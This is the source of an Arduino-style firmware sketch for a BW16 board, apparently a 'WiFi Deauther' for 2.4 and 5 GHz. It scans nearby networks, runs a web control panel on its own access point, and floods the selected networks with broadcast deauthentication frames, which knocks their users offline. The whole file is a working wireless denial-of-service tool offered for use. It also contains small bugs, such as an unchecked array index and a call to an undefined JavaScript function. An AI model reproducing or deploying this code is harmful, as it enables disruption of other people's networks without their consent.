#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "web.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "AI Thinker BW16-Kit";
char *pass = "deauther";

unsigned long attack_rate = 0;
unsigned long led_flash = 0;
bool led_on = false;

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
bool beacon_running = false;
String beacon_ssid;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};


rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    if(scan_results.size() < 15)scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}


std::map<String, String> parsePost(String &request) {
    std::map<String, String> post_params;

    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;

    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params[key] = value;
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params[key] = value;
    }

    return post_params;
}

String print_ssid(String ssid){
  String ssid_ = ssid;
  int ssid_length = ssid_.length();
  int max_length = 20;
  max_length - ssid_length;
  for(int i = 0;i < max_length;i++){
    ssid_ += " ";
  }
  return ssid_;
}

void startDeauth() {
  wifi_set_channel(current_channel);
  deauth_running = true;
}

void scan_n(){
  Serial.println("Clearing all access points...");
      for (int i = 0; i < scan_results.size(); i++) {
         scan_results[i].selected = false;
      }
      if (scanNetworks() != 0) {
        while(true) delay(1000);
      }
      for (int i = 0; i < scan_results.size(); i++) {
         Serial.print(i);
         Serial.print("\t " + print_ssid(scan_results[i].ssid));
         Serial.print("\t " + scan_results[i].bssid_str);
         Serial.print("\t " + String(scan_results[i].channel));
         Serial.print("\t " + String(scan_results[i].rssi));
         Serial.print("\t " + String(scan_results[i].channel >= 36 ? "5GHz" : "2.4GHz"));
         Serial.println();
      }
}
void stop_n(){
  deauth_running = false;
      beacon_running = false;
      led_on = !led_on;
       digitalWrite(LED_B, LOW);
       digitalWrite(LED_R, LOW);
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, "12");
  
  #ifdef DEBUG
  Serial.println("wake up..//");
  #endif
   scan_n();
   server.begin();
   digitalWrite(LED_R, HIGH);  // turn the RED LED on (HIGH is the voltage level)
  delay(1000);                // wait for a second
  digitalWrite(LED_R, LOW);   // turn the RED LED off by making the voltage LOW               // wait for a second
  digitalWrite(LED_G, HIGH);  // turn the GREEN LED on (HIGH is the voltage level)
  delay(1000);                // wait for a second
  digitalWrite(LED_G, LOW);   // turn the GREEN LED off by making the voltage LOW     // wait for a second
  digitalWrite(LED_B, HIGH);  // turn the BLUE LED on (HIGH is the voltage level)
  delay(1000);                // wait for a second
  digitalWrite(LED_B, LOW);   // turn the BLUE LED off by making the voltage LOW     // wait for a second
}
unsigned long server_handle = 0;
void loop() {
  
  if(millis() - attack_rate >= 10){
    if (deauth_running) {
      for(int j = 0;j < scan_results.size();j++){
         if(scan_results[j].selected == true){
          memcpy(deauth_bssid, scan_results[j].bssid, 6);
          wifi_set_channel(scan_results[j].channel);
          wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", 2);
         }
      }
     }
   
      attack_rate = millis();
  }
  
  if(millis() - led_flash >= 400){
    led_on = !led_on;
    if(deauth_running) digitalWrite(LED_B, led_on);
    if(beacon_running) digitalWrite(LED_R, led_on);
    led_flash = millis();
  }
   // listen for incoming clients
  if(millis() - server_handle >= 1000){
    WiFiClient client = server.available();
        if (client) {
          Serial.println("New client connected.");
          String request = client.readStringUntil('\r');
      
          if (request.indexOf("/getWifiList") != -1) {
            sendWifiList(client);
          } else if (request.indexOf("/updateSelection?network=") != -1) {
            updateSelection(client, request);
          } else if (request.indexOf("/buttonA") != -1) {
            digitalWrite(LED_G,HIGH);
            scan_n();
            digitalWrite(LED_G,LOW);
            Serial.println("Tombol A di klik");
          } else if (request.indexOf("/buttonB") != -1) {
            startDeauth();
            Serial.println("Tombol B di klik");
          } else if (request.indexOf("/buttonC") != -1) {
            stop_n();
            Serial.println("Tombol C di klik");
          }
          
      
          // Kirim halaman utama
          sendHomePage(client);
      
          delay(1);
          client.stop();
          Serial.println("Client disconnected.");
        
    }
    server_handle = millis();
  }
}
void sendHomePage(WiFiClient& client) {
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");
  client.println();

  client.println("<!DOCTYPE HTML>");
  client.println("<html>");
  client.println("<head><style>");
  
  // CSS untuk tampilan dark theme yang mirip dengan screenshot
  client.println("body { background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; }");
  client.println("h1 { color: #ff0000; text-align: center; }");
  client.println(".btn { background-color: #b30000; border: none; color: white; padding: 10px 20px; text-align: center; text-decoration: none; display: inline-block; margin: 4px 2px; cursor: pointer; font-size: 16px; }");
  client.println(".btn:hover { background-color: #e60000; }");
  client.println(".table { width: 100%; border-collapse: collapse; margin: 25px 0; font-size: 18px; min-width: 400px; }");
  client.println(".table th, .table td { padding: 12px 15px; border: 1px solid #ddd; text-align: left; }");
  client.println(".table th { background-color: #292929; color: white; }");
  client.println(".table tbody tr:nth-child(even) { background-color: #1a1a1a; }");
  client.println(".table tbody tr:hover { background-color: #333333; }");
  
  client.println("</style></head>");
  client.println("<body>");
  client.println("<style>table, th, td {border: 1px solid black;}</style>");
  client.println("<h1>WiFi Deauther 5ghz/2.4ghz</h1>");
 // client.println("<div id='wifiList'></div>");
  sendWifiList(client);
  client.println("<button class='btn' onclick='buttonClick(\"A\")'>Scan</button>");
  client.println("<button class='btn' onclick='buttonClick(\"B\")'>Deauth</button>");
  client.println("<button class='btn' onclick='buttonClick(\"C\")'>Stop</button>");
  client.println("<br><label>- Choose 1 target for best perfomance</label>");
  client.println("<br><label>- When you attack 5GHz WiFi, there is a possibility that the WiFi will suddenly turn off</label>");
  client.println("<br><label>- If the stop button doesn't work, you can use the RST button to turn it off");
  client.println("<br><label>- WiFi will turn off if you attack with more than 1 target");
  client.println("<script>");
  client.println("function toggleSelection(index) {");
  client.println("  var xhttp = new XMLHttpRequest();");
  client.println("  xhttp.open('GET', '/updateSelection?network=' + index, true);");
  client.println("  xhttp.send();");
  client.println("}");
  client.println("function buttonClick(btn) {");
  client.println("  var xhttp = new XMLHttpRequest();");
  client.println("  xhttp.open('GET', '/button' + btn, true);");
  client.println("  xhttp.send();");
  client.println("}");
  client.println("loadWifiList();");  // Load WiFi list when page loads
  client.println("</script>");
  
  client.println("</body>");
  client.println("</html>");
}

void sendWifiList(WiFiClient& client) {
  client.println("<table class='table'>");
  client.println("<thead><tr><th>SSID</th><th>MAC</th><th>Channel</th><th>RSSI</th><th>Freq</th><th>Select</th></tr></thead>");
  client.println("<tbody>");
  for (int i = 0; i < scan_results.size(); i++) {
    client.print("<tr>");
    client.print("<td>");
    client.print(scan_results[i].ssid);
    client.print("</td><td>");
    client.print(scan_results[i].bssid_str);
    client.print("</td><td>");
    client.print(String(scan_results[i].channel));
    client.print("</td><td>");
    client.print(String(scan_results[i].rssi));
    client.print(" dBm</td><td>");
    client.print(String(scan_results[i].channel >= 36 ? "5GHz" : "2.4GHz"));
    client.print("</td><td>");
    client.print("<input type='checkbox' id='network");
    client.print(i);
    client.print("' onclick='toggleSelection(");
    client.print(i);
    client.print(")'");
    if (scan_results[i].selected) {
      client.print(" checked");
    }
    client.print(">");
    client.println("</td></tr>");
  }
  client.println("</tbody>");
  client.println("</table>");
}
// Fungsi untuk mengubah status checkbox
void updateSelection(WiFiClient& client, String request) {
  int networkIndex = request.substring(request.indexOf('=') + 1).toInt();
  scan_results[networkIndex].selected = !scan_results[networkIndex].selected;
}
